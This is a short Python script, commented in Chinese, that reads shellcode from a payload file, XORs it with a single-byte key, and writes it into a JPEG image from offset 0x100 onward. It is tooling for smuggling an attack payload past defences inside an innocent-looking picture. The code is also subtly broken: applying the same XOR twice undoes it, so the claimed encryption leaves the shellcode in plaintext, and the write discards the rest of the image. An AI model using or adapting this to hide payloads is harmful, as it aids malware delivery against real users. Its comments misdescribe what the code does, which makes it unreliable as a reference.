# 读取payload.bin中的shellcode数据
with open('payload.bin', 'rb') as f:
    shellcode = f.read()

# 打开1.jpg并读取其中的数据
with open('1.jpg', 'rb') as f:
    img_data = bytearray(f.read())

# 定义加密函数
def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

# 对shellcode进行两次异或加密
key = 0x12
encrypted_shellcode = xor_encrypt(shellcode, key)
encrypted_shellcode = xor_encrypt(encrypted_shellcode, key)

# 将加密后的数据写入图片文件
img_data[0x100:] = encrypted_shellcode
with open('test.jpg', 'wb') as f:
    f.write(img_data)






